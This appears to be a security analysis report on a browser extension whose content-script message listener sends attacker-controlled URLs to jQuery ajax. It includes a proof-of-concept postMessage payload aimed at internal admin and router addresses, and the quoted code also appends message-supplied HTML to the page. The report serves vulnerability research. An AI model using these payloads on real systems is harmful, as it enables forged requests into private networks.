# CoCo Analysis: ejlghibhonddakjbgfmdpeifcoljnlob

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 51 (all variants of the same vulnerability pattern)

---

## Sink: cs_window_eventListener_message → jQuery_ajax_settings_url_sink

**CoCo Trace:**
```
$FilePath$/media/data2/jianjia/extension_data/unzipped_extensions/ejlghibhonddakjbgfmdpeifcoljnlob/opgen_generated_files/cs_0.js
Line 821    window.addEventListener("message", function(event) {
Line 822        if (event.data.function_name == "addbody") {
Line 823            $(event.data.function_params).appendTo("body");
Line 859                if (element.tiki_api_product !== "") {
                        $.ajax({ url: element.tiki_api_product, ... });
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js, cs_1.js)
window.addEventListener("message", function(event) {  // ← attacker-controlled
    if (event.data.function_name == "addbody") {
        $(event.data.function_params).appendTo("body");
    }

    if (event.data.function_name == "loadcharttiki") {
        loadcharttiki(event.data.function_params);  // ← attacker-controlled params
    }

    if (event.data.function_name == "loadchartshopee") {
        loadchartshopee(event.data.function_params);  // ← attacker-controlled params
    }

    if (event.data.function_name == "loadchartsendo") {
        loadchartsendo(event.data.function_params);  // ← attacker-controlled params
    }

    if (event.data.function_name == "loadchartlazada") {
        loadchartlazada(event.data.function_params);  // ← attacker-controlled params
    }
});

// Example: loadcharttiki function
function loadcharttiki(params) {  // ← attacker-controlled params array
    var checkExist = setInterval(function() {
        for (let i = 0; i < params.length; i++) {
            const element = params[i];  // ← attacker-controlled object
            if ($(element.elementtocheck).length > 0) {
                clearInterval(checkExist);

                if (element.tiki_api_product !== "") {
                    $.ajax({
                        url: element.tiki_api_product,  // ← SINK: attacker-controlled URL
                        success: function(result) {
                            // Process response
                            var spid = result.current_seller.product_id;
                            // ... makes additional request to backend with spid
                        }
                    });
                }
            }
        }
    }, 100);
}

// Similar pattern in loadchartshopee, loadchartsendo, loadchartlazada
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `https://*.tiki.vn/*`
- `https://*.shopee.vn/*`
- `https://*.sendo.vn/*`
- `https://*.lazada.vn/*`

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious code on tiki.vn, shopee.vn, sendo.vn, or lazada.vn
window.postMessage({
    function_name: "loadcharttiki",
    function_params: [{
        elementtocheck: "body",  // Valid selector to pass the check
        tiki_api_product: "http://internal-server.local/admin/delete-users",  // Attacker-controlled URL
        pricechart_id: "test",
        insertbefore: "",
        insertafter: ""
    }]
}, "*");

// Or target other e-commerce sites
window.postMessage({
    function_name: "loadchartshopee",
    function_params: [{
        elementtocheck: "body",
        shopee_api_product: "http://192.168.1.1/router-admin",  // Internal network SSRF
        pricechart_id: "test",
        insertbefore: "",
        insertafter: ""
    }]
}, "*");
```

**Impact:** Server-Side Request Forgery (SSRF) - Attacker can make privileged cross-origin requests to arbitrary URLs including internal networks, bypassing CORS restrictions. The extension has host permissions to access these e-commerce sites, allowing attackers controlling those pages to abuse the extension's privileged network access to request internal resources, scan internal networks, or attack backend services.
